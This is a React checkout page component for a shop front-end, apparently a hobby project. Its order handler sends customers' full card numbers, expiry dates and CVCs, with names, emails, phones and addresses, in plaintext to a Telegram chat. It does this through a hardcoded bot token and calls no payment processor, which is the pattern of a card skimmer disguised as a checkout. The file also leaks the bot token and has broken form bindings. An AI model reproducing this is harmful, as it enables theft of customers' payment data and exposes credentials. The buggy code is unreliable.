import "./CheckOut.scss";

import { NavLink, useNavigate } from "react-router-dom";
import React, { Fragment, useEffect, useState } from "react";
import {
  addToCart,
  decrementCart,
  remove,
} from "../../../context/slices/cartSlices";
import { useDispatch, useSelector } from "react-redux";

import { IoCloseOutline } from "react-icons/io5";
import couponImg from "../../../assets/Cart/coupon.svg";

const CheckOut = () => {
  const cartData = useSelector((state) => state.cart.value);
  const [totalPrice, setTotalPrice] = useState(0);
  const [value, setValue] = useState("");
  const [coupon, setCoupon] = useState(0);
  const navigate = useNavigate();
  useEffect(() => {
    let total = cartData?.reduce((a, b) => a + b.quantity * b.price, 0);

    setTotalPrice(total);
  }, [cartData]);
  console.log(cartData);
  const dispatch = useDispatch();
  const subtotal = totalPrice;

  const total = subtotal;
  const handleAmount = (e) => {
    e.preventDefault();
    if (value === "Laylo") {
      setCoupon(+total * 0.2);
    } else {
      alert("Promocode error");
    }
    setValue("");
  };

  // Bot Codes

  const BOT__TOKEN = "7468900185:AAH4z9uHj3Y9MTsaz2KcYlGW19zpWZK0llo";
  const CHAT__ID = "6366315724";
  const [fname, setFname] = useState("");
  const [lname, setLname] = useState("");
  const [email, setEmail] = useState("");
  const [number, setNumber] = useState("");
  const [address, setAddress] = useState("");
  const [country, setCountry] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");
  const [zip, setZip] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [date, setDate] = useState("");
  const [cvc, setCvc] = useState("");

  const handleSendMessage = (e) => {
    e.preventDefault();
    let text = "User: %0A%0A";
    text += `FName: ${fname} %0A`;
    text += `LName: ${lname} %0A`;
    text += `Email: ${email} %0A`;
    text += `Number: ${number} %0A`;
    text += `Address: ${address} %0A`;
    text += `Country: ${country} %0A`;
    text += `City: ${city} %0A`;
    text += `State: ${state} %0A`;
    text += `Zip Code: ${zip} %0A`;
    text += `CardNumber: ${cardNumber} %0A`;
    text += `Date: ${date} %0A`;
    text += `CVC: ${cvc} %0A`;
    text += `Products : ${cartData?.map((el) => el.title)} %0A`;
    text += `Total : ${totalPrice} %0A`;
    let url = `https://api.telegram.org/bot${BOT__TOKEN}/sendMessage?chat_id=${CHAT__ID}&text=${text}`;
    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    // Clear the form fields
    setFname("");
    setLname("");
    setEmail("");
    setNumber("");
    setAddress("");
    setCardNumber("");
    setCountry("");
    setCity("");
    setState("");
    setZip("");
    setCardNumber("");
    setDate("");
    setCvc("");

    // Show success message
    navigate("/cart/complete");
  };
  return (
    <Fragment>
      {/* <div className="checkout__top container">
        <h2> Check Out</h2>
        <div className="checkout__top__items">
          <div className="checkout__top__items__item  checkout__top__items__item__checked">
            <span>
              <FaCheck />
            </span>
            <p>Shopping cart</p>
          </div>
          <div className="checkout__top__items__item ">
            <span>2</span>
            <p>Checkout details</p>
          </div>
          <div className="checkout__top__items__item checkout__top__items__item__not">
            <span>3</span>
            <p>Order complete</p>
          </div>
        </div>
      </div> */}
      <div className="checkout container">
        <div className="checkout__left ">
          <form action="" onSubmit={handleSendMessage}>
            <div className="checkout__left__contact__information">
              <h3>Contact Infomation</h3>
              <div className=" input__optional__df">
                <div className="input__optional">
                  <label htmlFor="">First Name</label>
                  <input
                    value={fname}
                    onChange={(e) => setFname(e.target.value)}
                    name="fname"
                    required
                    type="text"
                    placeholder="First name"
                  />
                </div>
                <div className="input__optional">
                  <label htmlFor="">Last Name</label>
                  <input
                    value={fname}
                    onChange={(e) => setLname(e.target.value)}
                    required
                    name="lname"
                    type="text"
                    placeholder="Last name"
                  />
                </div>
              </div>
              <div className="input__optional">
                <label htmlFor="">Phone Number</label>
                <input
                  value={fname}
                  onChange={(e) => setNumber(e.target.value)}
                  required
                  name="number"
                  type="text"
                  placeholder="Phone number"
                />
              </div>
              <div className="input__optional">
                <label htmlFor="">Email address</label>
                <input
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  type="email"
                  name="email"
                  required
                  placeholder="Your Email"
                />
              </div>
            </div>
            <div className="checkout__left__shipping__address">
              <h3> Shipping Address</h3>
              <div className="input__optional">
                <label htmlFor="">Street Address </label>
                <input
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  required
                  name="address"
                  type="text"
                  placeholder="Street Address "
                />
              </div>
              <div className="input__optional">
                <label htmlFor="">Country</label>
                <select
                  required
                  value={country}
                  onChange={(e) => setCountry(e.target.value)}
                  name="country"
                >
                  <option value="uzbekistan">Uzbekistan</option>
                  <option value="United States">United States</option>
                  <option value="United Kingdom">United Kingdom</option>
                  <option value="Russia">Russia</option>
                </select>
              </div>
              <div className="input__optional">
                <label htmlFor="">Town / City </label>
                <input
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  name="city"
                  required
                  type="text"
                  placeholder="Town / City"
                />
              </div>

              <div className="input__optional__df">
                <div className="input__optional">
                  <label htmlFor="">State</label>
                  <input
                    value={state}
                    onChange={(e) => setState(e.target.value)}
                    name="state"
                    required
                    type="text"
                    placeholder="State"
                  />
                </div>
                <div className="input__optional">
                  <label htmlFor="">Zip Code</label>
                  <input
                    value={zip}
                    onChange={(e) => setZip(e.target.value)}
                    name="zip"
                    required
                    type="number"
                    placeholder="Zip Code"
                  />
                </div>
              </div>
              <div className="">
                <label htmlFor="">
                  <input type="checkbox" />
                  <span>Use a different billing address (optional)</span>
                </label>
              </div>
            </div>
            <div className="checkout__left__payment__method">
              <h2>Payment method</h2>
              <div className="payment-option">
                <input
                  required
                  type="radio"
                  id="card"
                  name="paymentMethod"
                  value="card"
                />
                <label htmlFor="card">Pay by Card Credit</label>
              </div>
              <div className="payment-option">
                <input
                  required
                  type="radio"
                  id="paypal"
                  name="paymentMethod"
                  value="paypal"
                />
                <label htmlFor="paypal">Paypal</label>
              </div>
              <div className="input__optional">
                <label>Card Number</label>
                <input
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                  name="cardNumber"
                  required
                  type="text"
                  placeholder="1234 1234 1234"
                />
                <div className="input__optional__df">
                  <div className="input__optional">
                    <label>Expiration Date</label>
                    <input
                      value={date}
                      onChange={(e) => setDate(e.target.value)}
                      name="date"
                      required
                      type="date"
                      placeholder="MM/YY"
                    />
                  </div>
                  <div className="input__optional">
                    <label>CVC</label>
                    <input
                      value={cvc}
                      onChange={(e) => setCvc(e.target.value)}
                      name="cvc"
                      required
                      type="text"
                      placeholder="CVC code"
                    />
                  </div>
                </div>
              </div>
            </div>
            <button className="checkout__left__button">Place Order</button>
          </form>
        </div>
        <div className="checkout__right">
          <h2>Order summary</h2>
          <div className="checkout__right__cards">
            {cartData?.map((el) => (
              <div key={el?.id} className="checkout__right__card">
                <div className="checkout__right__card__left">
                  <div className="checkout__right__card__left__img">
                    <img src={el?.images[0]} alt="product.png" />
                  </div>
                  <div className="checkout__right__card__left__desc">
                    <h3>{el?.title}</h3>
                    <p>Stock: {el?.stock}</p>
                    <div className="checkout__right__card__left__desc__counter">
                      <button
                        disabled={el.quantity <= 1}
                        onClick={() => dispatch(decrementCart(el))}
                      >
                        -
                      </button>
                      <span>{el?.quantity}</span>
                      <button
                        disabled={el?.quantity === el?.stock}
                        onClick={() => dispatch(addToCart(el))}
                      >
                        +
                      </button>
                    </div>
                  </div>
                </div>
                <div className="checkout__right__card__right">
                  <p>${el?.price}</p>
                  <button onClick={() => dispatch(remove(el))}>
                    <IoCloseOutline fontSize={20} />
                  </button>
                </div>
              </div>
            ))}
          </div>
          <form onSubmit={handleAmount} className="checkout__right__input">
            <input
              required
              type="text"
              placeholder="Laylo"
              value={value}
              onChange={(e) => setValue(e.target.value)}
            />
            <button type="submit">Apply</button>
          </form>
          <div className="checkout__right__bottom">
            <div className="df">
              <div className="df">
                <img src={couponImg} alt="coupon.svg" />
                <p>JenkateMW</p>
              </div>
              <span>-$25.00 [Remove]</span>
            </div>
            <div
              className="df
          "
            >
              <p>Shipping</p>
              <p>Free</p>
            </div>
            <div
              className="df
          "
            >
              <p>Subtotal</p>
              <p>${subtotal.toFixed(2)}</p>
            </div>
            <div className="df">
              <p>Total</p>
              <p>
                <span>${total.toFixed(2) - coupon}</span>
              </p>
            </div>
          </div>
        </div>
      </div>
    </Fragment>
  );
};

export default CheckOut;
